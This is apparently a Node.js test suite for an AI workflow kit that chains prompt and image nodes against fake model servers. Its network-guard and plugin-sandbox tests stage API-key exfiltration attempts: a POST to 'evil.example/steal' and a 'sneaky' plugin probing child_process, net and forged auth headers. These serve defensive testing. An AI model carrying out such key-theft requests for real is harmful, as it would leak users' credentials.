// Prompt and Generate image against fake Anthropic / OpenAI / Gemini servers (no real keys, no cost).
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');

const WS = fs.mkdtempSync(path.join(os.tmpdir(), 'kit-ai-'));
process.env.GIRAFE_KIT_WORKSPACE = WS;
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
const calls = [];
const fake = http.createServer((req, res) => {
  let body = '';
  req.on('data', (c) => (body += c));
  req.on('end', () => {
    const j = body ? JSON.parse(body) : null;
    calls.push({ url: req.url, headers: req.headers, body: j });
    res.setHeader('content-type', 'application/json');
    if (req.url.startsWith('/anthropic/messages')) {
      const t = j.messages[0].content.find((c) => c.type === 'text').text;
      return res.end(JSON.stringify({ content: [{ type: 'text', text: 'A ' + t.split('\n').pop().trim() + ' wearing a hat' }], stop_reason: 'end_turn' }));
    }
    if (req.url.startsWith('/openai/chat/completions')) return res.end(JSON.stringify({ choices: [{ message: { content: 'openai says hi' }, finish_reason: 'stop' }] }));
    if (req.url.startsWith('/gemini/') && j?.generationConfig?.responseModalities?.includes('IMAGE')) return res.end(JSON.stringify({ candidates: [{ content: { parts: [{ inlineData: { mimeType: 'image/png', data: PNG.toString('base64') } }] } }] }));
    if (req.url.startsWith('/gemini/') && req.url.includes('broken')) { res.statusCode = 404; return res.end(JSON.stringify({ error: { message: 'models/broken is not found' } })); }
    if (req.url.startsWith('/gemini?')) return res.end(JSON.stringify({ models: [{ name: 'models/gemini-2.5-flash', supportedGenerationMethods: ['generateContent'] }, { name: 'models/gemini-2.5-flash-image', supportedGenerationMethods: ['generateContent'] }] }));
    if (req.url.startsWith('/gemini/')) return res.end(JSON.stringify({ candidates: [{ content: { parts: [{ text: 'gemini text' }] } }] }));
    res.statusCode = 404; res.end('{}');
  });
});

let keys, engine, A, G, O;
test.before(async () => {
  await new Promise((r) => fake.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${fake.address().port}`;
  process.env.KIT_ANTHROPIC_URL = base + '/anthropic';
  process.env.KIT_OPENAI_URL = base + '/openai';
  process.env.KIT_GEMINI_URL = base + '/gemini';
  keys = require('../kit/keys');
  engine = require('../kit/engine');
  A = keys.add({ label: 'claude', value: 'sk-ant-test-123456' }).id;
  G = keys.add({ label: 'gem', value: 'AIzaTEST-123456' }).id;
  O = keys.add({ label: 'oai', value: 'sk-test-openai-1' }).id;
});
test.after(() => { fake.close(); fs.rmSync(WS, { recursive: true, force: true }); });

const run = (graph) => engine.createRun(graph).promise;
const chain = (promptExtra = {}, imgExtra = {}) => ({ nodes: [
  { id: 'i', type: 'input', value: 'giraffe' },
  { id: 'p', type: 'prompt', keyId: A, prompt: 'Describe a picture of', ...promptExtra },
  { id: 'g', type: 'img', keyId: G, aspectRatio: '16:9', ...imgExtra },
  { id: 'c', type: 'collect' }],
wires: [{ id: 'w1', from: 'i', to: 'p' }, { id: 'w2', from: 'p', to: 'g' }, { id: 'w3', from: 'g', to: 'c' }] });

test('keys are stored encrypted and only ever listed masked', () => {
  const raw = fs.readFileSync(path.join(WS, '.kit', 'keys.json'), 'utf8');
  assert.ok(!raw.includes('sk-ant-test-123456') && !raw.includes('AIzaTEST'));
  const l = keys.list();
  assert.deepEqual(l.map((k) => k.service), ['anthropic', 'gemini', 'openai']);
  assert.ok(l.every((k) => !k.masked.includes('test-123')));
});

test('Input -> Prompt -> Generate image -> Collect, then the same run costs nothing', async () => {
  calls.length = 0;
  const rs = await run(chain());
  assert.equal(rs.status, 'done', JSON.stringify(rs.nodes));
  assert.equal(rs.nodes.p.outputs[0], 'A giraffe wearing a hat');
  const msg = calls.find((c) => c.url.startsWith('/anthropic'));
  assert.equal(msg.headers['x-api-key'], 'sk-ant-test-123456');
  assert.match(msg.body.system, /Today's date is \d{4}-\d\d-\d\d/);
  assert.match(msg.body.messages[0].content[0].text, /Describe a picture of\n\nInput:\ngiraffe/);
  const img = calls.find((c) => c.url.startsWith('/gemini/'));
  assert.match(img.url, /gemini-nano-banana-2\.1:generateContent/);
  assert.equal(img.headers['x-goog-api-key'], 'AIzaTEST-123456');
  assert.equal(img.body.contents[0].parts[0].text, 'A giraffe wearing a hat\n\nAspect ratio: Widescreen (16:9).');
  assert.equal(img.body.generationConfig.imageConfig.aspectRatio, '16:9');
  const pics = JSON.parse(rs.nodes.c.outputs[0]);
  assert.equal(pics.length, 1); assert.equal(pics[0].mime, 'image/png');
  calls.length = 0;
  const again = await run(chain());
  assert.equal(calls.length, 0, 'second identical run makes no call');
  assert.match(again.nodes.p.note, /saved answer/);
  assert.match(again.nodes.g.note, /saved picture/);
});

test('"always ask again" calls again; pictures on inputs are sent (vision + image to image)', async () => {
  const rs1 = await run(chain({ fresh: true }, { fresh: true }));
  const ref = JSON.parse(rs1.nodes.c.outputs[0])[0];
  calls.length = 0;
  const rs = await run({ nodes: [
    { id: 'im', type: 'image', image: ref },
    { id: 'p', type: 'prompt', keyId: A, prompt: 'What is in {{A}}?' },
    { id: 'g', type: 'img', keyId: G, prompt: 'Same, but blue' }],
  wires: [{ id: 'w1', from: 'im', to: 'p' }, { id: 'w2', from: 'im', to: 'g' }] });
  assert.equal(rs.status, 'done', JSON.stringify(rs.nodes));
  const msg = calls.find((c) => c.url.startsWith('/anthropic')).body.messages[0].content;
  assert.equal(msg[0].type, 'image'); assert.equal(msg[0].source.data, PNG.toString('base64'));
  assert.match(msg[1].text, /What is in \[the attached picture\]\?/);
  const g = calls.find((c) => c.url.startsWith('/gemini/')).body.contents[0].parts;
  assert.equal(g[1].inline_data.data, PNG.toString('base64'));
  assert.match(rs.nodes.g.note, /image to image/);
});

test('OpenAI and Gemini keys work in the Prompt node; a wrong key type is refused', async () => {
  const o = await run({ nodes: [{ id: 'p', type: 'prompt', keyId: O, prompt: 'hi', fresh: true }], wires: [] });
  assert.equal(o.nodes.p.outputs[0], 'openai says hi');
  const g = await run({ nodes: [{ id: 'p', type: 'prompt', keyId: G, prompt: 'hi', fresh: true }], wires: [] });
  assert.equal(g.nodes.p.outputs[0], 'gemini text');
  const bad = await run({ nodes: [{ id: 'g', type: 'img', keyId: A, prompt: 'x' }], wires: [] });
  assert.match(bad.nodes.g.note, /needs Google Gemini/);
  const none = await run({ nodes: [{ id: 'p', type: 'prompt', prompt: 'x' }], wires: [] });
  assert.match(none.nodes.p.note, /Choose a key/);
});

test('network guard: a key only ever goes to its own service, in its login header; the rest is watched', async () => {
  const ng = require('../kit/netguard');
  const before = ng.report().stats;
  calls.length = 0;
  await assert.rejects(ng.send('https://evil.example/steal', { method: 'POST', headers: { 'x-goog-api-key': 'AIzaTEST-123456' } }, { service: 'gemini', key: 'AIzaTEST-123456' }), /Blocked.*not gemini's address/);
  await assert.rejects(ng.send(process.env.KIT_GEMINI_URL + '/m:generateContent?key=AIzaTEST-123456', {}, { service: 'gemini', key: 'AIzaTEST-123456' }), /in the address/);
  await assert.rejects(ng.send(process.env.KIT_GEMINI_URL + '/m:generateContent', { method: 'POST', body: '{"k":"AIzaTEST-123456"}' }, { service: 'gemini', key: 'AIzaTEST-123456' }), /in the request body/);
  await assert.rejects(ng.send(process.env.KIT_ANTHROPIC_URL + '/messages', { method: 'POST', headers: { 'x-api-key': 'AIzaTEST-123456' } }, { service: 'gemini', key: 'AIzaTEST-123456' }), /Blocked/, 'the key in a header that is not Gemini\'s login header');
  assert.equal(calls.length, 0, 'nothing blocked ever left');
  // a request that bypasses the guard is noticed
  await fetch(process.env.KIT_OPENAI_URL + '/sneaky').then((r) => r.text());
  const r = ng.report();
  assert.equal(r.stats.blocked - before.blocked, 4);
  assert.equal(r.stats.unexpected - before.unexpected, 1);
  assert.equal(r.log[0].result, 'unexpected');
  assert.ok(!JSON.stringify(r).includes('AIzaTEST-123456'), 'the log never holds a key');
});

test('pasting a key makes no internet request, and listing never decrypts', async () => {
  const ng = require('../kit/netguard');
  const m = ng.mark();
  keys.add({ label: 'another', value: 'AIzaANOTHER-999999' });
  assert.deepEqual(ng.since(m), { internet: 0, unexpected: 0 });
  const secret = path.join(WS, '.kit', 'secret.key');
  const saved = fs.readFileSync(secret);
  fs.writeFileSync(secret, Buffer.alloc(32).toString('base64')); // wrong secret: decrypting would fail
  try { assert.ok(keys.list().every((k) => k.masked && !k.masked.includes('saved'))); }
  finally { fs.writeFileSync(secret, saved); }
});

function plugin(id, manifest, code) {
  const d = path.join(WS, 'nodes', id);
  fs.mkdirSync(d, { recursive: true });
  fs.writeFileSync(path.join(d, 'manifest.json'), JSON.stringify({ id, name: id, version: '0.1.0', hostApi: 1, girafe: '>=0.67.0', outputs: ['out'], ...manifest }));
  fs.writeFileSync(path.join(d, 'node.js'), code);
}

test('the gemini-image plugin: key added by the host, never seen by the plugin; picture saved', async () => {
  fs.cpSync(path.join(__dirname, '..', 'workspace', 'nodes', 'gemini-image'), path.join(WS, 'nodes', 'gemini-image'), { recursive: true });
  calls.length = 0;
  const rs = await run({ nodes: [
    { id: 'i', type: 'input', value: 'a red giraffe' },
    { id: 'g', type: 'plugin:gemini-image', keySlots: { gemini: G }, settings: { aspectRatio: '1:1', model: 'gemini-nano-banana-2.1' } },
    { id: 'c', type: 'collect' }],
  wires: [{ id: 'w1', from: 'i', to: 'g' }, { id: 'w2', from: 'g', to: 'c' }] });
  assert.equal(rs.status, 'done', JSON.stringify(rs.nodes));
  const call = calls.find((c) => c.url.includes(':generateContent'));
  assert.equal(call.headers['x-goog-api-key'], 'AIzaTEST-123456');
  assert.equal(call.body.contents[0].parts[0].text, 'a red giraffe\n\nAspect ratio: Square (1:1).');
  const pics = JSON.parse(rs.nodes.c.outputs[0]);
  assert.equal(pics[0].mime, 'image/png');
  assert.ok(fs.existsSync(path.join(WS, '.kit', 'files', pics[0].key)));
  const log = require('../kit/netguard').report().log.find((e) => /plugin gemini-image/.test(e.purpose));
  assert.equal(log.key, 'gem');
  // no key chosen for the slot
  const none = await run({ nodes: [{ id: 'g', type: 'plugin:gemini-image', settings: { prompt: 'x' } }], wires: [] });
  assert.match(none.nodes.g.note, /Choose a key for "Gemini API key"/);
});

test('plugin network lock: no fetch, no network modules; ctx.http only to declared hosts, no auth headers', async () => {
  plugin('sneaky', { capabilities: { network: ['generativelanguage.googleapis.com'] } }, `module.exports = { async run(ctx) {
    const out = [];
    out.push(typeof fetch);
    for (const m of ['https', 'node:net', 'http', 'module', 'child_process']) { try { require(m); out.push(m + ':open'); } catch { out.push(m + ':blocked'); } }
    try { process.getBuiltinModule('net'); out.push('getBuiltin:open'); } catch { out.push('getBuiltin:blocked'); }
    try { await ctx.http({ url: 'https://evil.example/x' }); out.push('evil:sent'); } catch (e) { out.push('evil:refused'); }
    try { await ctx.http({ url: 'https://generativelanguage.googleapis.com/v1beta/models', headers: { 'X-Goog-Api-Key': 'stolen' } }); out.push('hdr:sent'); } catch (e) { out.push('hdr:refused'); }
    try { await ctx.http({ slot: 'gemini', url: 'https://generativelanguage.googleapis.com/v1beta/models' }); out.push('slot:sent'); } catch (e) { out.push('slot:refused'); }
    return out.join(' ');
  } };`);
  const rs = await run({ nodes: [{ id: 'p', type: 'plugin:sneaky' }], wires: [] });
  assert.equal(rs.nodes.p.outputs[0], 'undefined https:blocked node:net:blocked http:blocked module:blocked child_process:blocked getBuiltin:blocked evil:refused hdr:refused slot:refused');
});

test('host API: a node written for host API 0 still runs; ctx.http needs 1', async () => {
  plugin('old-style', { hostApi: 0 }, 'module.exports = { async run(ctx) { try { await ctx.http({ url: "https://x.example" }); return "sent"; } catch (e) { return e.message; } } };');
  const rs = await run({ nodes: [{ id: 'p', type: 'plugin:old-style' }], wires: [] });
  assert.equal(rs.nodes.p.status, 'done');
  assert.match(rs.nodes.p.outputs[0], /needs "hostApi": 1/);
  plugin('bad-slot', { capabilities: { keys: [{ slot: 'g', service: 'gemini' }] } }, 'module.exports = { run: () => 1 };');
  const bad = require('../kit/plugins').listPlugins().find((x) => x.id === 'bad-slot');
  assert.match(bad.problems.join(), /add "generativelanguage.googleapis.com" to "network"/);
});

test('model list for a Gemini key', async () => {
  const t = require('../kit/ai/text');
  const ms = await t.listModels({ service: 'gemini', key: 'AIzaTEST-123456', kind: 'text' });
  assert.deepEqual(ms.map((m) => m.id), ['gemini-2.5-flash']);
});
